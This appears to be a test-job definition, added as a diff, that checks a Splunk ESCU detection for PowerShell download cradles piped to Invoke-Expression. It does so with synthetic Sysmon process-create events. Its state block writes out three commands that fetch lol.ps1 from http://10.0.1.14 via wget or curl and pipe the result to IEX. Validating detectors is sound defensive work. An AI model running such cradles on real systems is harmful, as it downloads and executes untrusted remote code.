@@ -1,0 +1,95 @@
+type: job
+name: File Download or Read to Pipe Execution
+detection:
+  source: escu
+  name: "ESCU - File Download or Read to Pipe Execution - Rule"
+  id: 26f86252-1549-45e1-a212-eb26840e86bc
+description: |
+  Validates detection of a command line that pipes a script download into
+  Invoke-Expression: Sysmon EID 1 (Process Create) records cmd.exe running
+  `cmd /c powershell -c` with a PowerShell command that fetches a script over
+  HTTP with a web-request alias, for example curl or wget, and pipes it to
+  IEX or Invoke-Expression, and a second Sysmon EID 1 records the
+  powershell.exe child running the same command.
+
+mitre:
+  tactics: [command-and-control]
+  techniques: [T1105]
+
+state:
+  domain_short:       CORP
+  domain_tld:         local
+  domain_short_lower: fn.lower(ref.domain_short)
+  domain_fqdn:        "${ref.domain_short_lower}.${ref.domain_tld}"
+  computer:           gen.hostname(class=windows-server, domain=ref.domain_fqdn)
+  sysmon_pid:         gen.int(min=1000, max=4000)
+  sysmon_tid:         gen.int(min=1000, max=9999)
+  user_name:          Administrator
+  logon_guid_raw:     gen.uuid()
+  logon_id_hex:       gen.hex(len=6, case=lower)
+  shell_guid_raw:     gen.uuid()
+  shell_process_id:   gen.int(min=1000, max=9999)
+  wget_iex:           "&{ wget http://10.0.1.14/lol.ps1 |IEX }"
+  curl_iex:           "&{ curl http://10.0.1.14/lol.ps1 |IEX }"
+  curl_invoke_expr:   "&{ curl http://10.0.1.14/lol.ps1 |Invoke-Expression }"
+
+workloads:
+  - scenario: scenarios/windows/sysmon/process-create/download-cradle-pipe-to-iex
+    bindings:
+      domain_short:       ref.domain_short
+      domain_tld:         ref.domain_tld
+      computer:           ref.computer
+      sysmon_pid:         ref.sysmon_pid
+      sysmon_tid:         ref.sysmon_tid
+      user_name:          ref.user_name
+      logon_guid_raw:     ref.logon_guid_raw
+      logon_id_hex:       ref.logon_id_hex
+      shell_guid_raw:     ref.shell_guid_raw
+      shell_process_id:   ref.shell_process_id
+      powershell_command: ref.wget_iex
+    expectation:
+      expected: alert
+      summary: "cmd.exe starts PowerShell to fetch a script with wget and pipe it to IEX"
+      mitre:
+        tactics: [command-and-control]
+        techniques: [T1105]
+
+  - scenario: scenarios/windows/sysmon/process-create/download-cradle-pipe-to-iex
+    bindings:
+      domain_short:       ref.domain_short
+      domain_tld:         ref.domain_tld
+      computer:           ref.computer
+      sysmon_pid:         ref.sysmon_pid
+      sysmon_tid:         ref.sysmon_tid
+      user_name:          ref.user_name
+      logon_guid_raw:     ref.logon_guid_raw
+      logon_id_hex:       ref.logon_id_hex
+      shell_guid_raw:     ref.shell_guid_raw
+      shell_process_id:   ref.shell_process_id
+      powershell_command: ref.curl_iex
+    expectation:
+      expected: alert
+      summary: "cmd.exe starts PowerShell to fetch a script with curl and pipe it to IEX"
+      mitre:
+        tactics: [command-and-control]
+        techniques: [T1105]
+
+  - scenario: scenarios/windows/sysmon/process-create/download-cradle-pipe-to-iex
+    bindings:
+      domain_short:       ref.domain_short
+      domain_tld:         ref.domain_tld
+      computer:           ref.computer
+      sysmon_pid:         ref.sysmon_pid
+      sysmon_tid:         ref.sysmon_tid
+      user_name:          ref.user_name
+      logon_guid_raw:     ref.logon_guid_raw
+      logon_id_hex:       ref.logon_id_hex
+      shell_guid_raw:     ref.shell_guid_raw
+      shell_process_id:   ref.shell_process_id
+      powershell_command: ref.curl_invoke_expr
+    expectation:
+      expected: alert
+      summary: "cmd.exe starts PowerShell to fetch a script with curl and pipe it to Invoke-Expression"
+      mitre:
+        tactics: [command-and-control]
+        techniques: [T1105]
